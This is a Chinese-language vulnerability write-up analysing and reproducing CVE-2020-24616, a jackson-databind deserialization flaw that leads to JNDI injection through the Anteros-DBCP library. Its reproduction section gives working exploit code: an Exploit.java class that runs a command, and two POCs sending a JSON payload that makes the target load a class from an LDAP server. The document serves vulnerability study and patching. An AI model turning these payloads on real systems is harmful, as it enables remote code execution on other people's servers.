（CVE-2020-24616）FasterXML jackson-databind 远程命令执行漏洞
=============================================================

一、漏洞简介
------------

br.com.anteros.dbcp.AnterosDBCPConfig类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成RCE。

### 利用条件

-   开启enableDefaultTyping()

-   使用了br.com.anteros第三方依赖

二、漏洞影响
------------

jackson-databind before 2.9.10.4jackson-databind before 2.8.11.6jackson-databind before 2.7.9.7

三、复现过程
------------

### 漏洞分析

> 相关信息：

`https://github.com/FasterXML/jackson-databind/issues/2814`

1.png

之后查找对应的issue，找到对应的绕过黑名单类：

2.png

之后在源码中定位到`br.com.anteros.dbcp.AnterosDBCPDataSource`类，可以看到该类继承自`AnterosDBCPConfig`类：

3.jpeg

之后全局搜索`healthCheckRegistry`发现在函数`setHealthCheckRegistry`作为参数进行传递，之后该参数被传入了`super.setHealthCheckRegistry(healthCheckRegistry);，`也就是调用了父类的`setHealthCheckRegistry`方法，并将此参数作为只传递，下面我们跟进该函数来看看：

4.jpeg

在父类的`setHealthCheckRegistry`方法中首先会判断`healthCheckRegistry`是否为空，如果不为空则调用当前类的`getObjectOrPerformJndiLookup`方法并将`healthCheckRegistry`作为参数传递，下面继续跟踪看看：

5.jpeg

之后再`getObjectOrPerformJndiLookup`方法中可以看到，此处的参数`object`(即:传入的数据类型healthCheckRegistry的值)首先会判断其数据类型，可以看到数据类型为`String`时会被带入`initCtx.lookup`，从而导致JNDI注入：

6.jpeg

> 整个利用链如下所示：

    mapper.readValue
        ->AnterosDBCPDataSource.setHealthCheckRegistry
            ->AnterosDBCPDataSource.setHealthCheckRegistry
                ->AnterosDBCPDataSource.getObjectOrPerformJndiLookup
                    ->initCtx.lookup();

### 漏洞复现

pom.xml如下所示：

    <dependencies>
        <dependency>
          <groupId>com.fasterxml.jackson.core</groupId>
          <artifactId>jackson-databind</artifactId>
          <version>2.9.10.4</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.11.2</version>
        </dependency>
        <dependency>
            <groupId>br.com.anteros</groupId>
            <artifactId>Anteros-DBCP</artifactId>
            <version>1.0.1</version>
        </dependency>
        <dependency>
          <groupId>org.slf4j</groupId>
          <artifactId>slf4j-nop</artifactId>
          <version>1.7.2</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/javax.transaction/jta -->
          <dependency>
              <groupId>javax.transaction</groupId>
              <artifactId>jta</artifactId>
              <version>1.1</version>
          </dependency>
      </dependencies>

#### 漏洞利用

##### Exploit.java代码如下：

    import java.lang.Runtime;

    public class Exploit {
        static {
            try {
                Runtime.getRuntime().exec("calc");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

之后编译Exploit.java，并且使用python启动一个简易的Web服务，将Exploit.class文件放置到web目录下，之后使用marshalsec启动一个LDAP服务：

7.png

##### 执行漏洞POC1:

    import com.fasterxml.jackson.databind.ObjectMapper;

    public class POC {
        public static void main(String[] args) throws Exception {
            String payload = "[\"br.com.anteros.dbcp.AnterosDBCPDataSource\",{\"healthCheckRegistry\":\"ldap://127.0.0.1:1099/Exploit\"}]";
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            mapper.readValue(payload, Object.class);
        }
    }

之后运行该程序，成功执行命令，弹出计算器：

8.jpeg

##### 执行漏洞POC2

Poc.java代码如下所示：

    import com.fasterxml.jackson.databind.ObjectMapper;

    public class POC {
        public static void main(String[] args) throws Exception {
            String payload = "[\"br.com.anteros.dbcp.AnterosDBCPDataSource\",{\"metricRegistry\":\"ldap://127.0.0.1:1099/Exploit\"}]";
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            mapper.readValue(payload, Object.class);
        }
    }

之后运行该程序，成功执行命令，弹出计算器：

9.jpeg

参考链接
--------

> https://xz.aliyun.com/t/8210
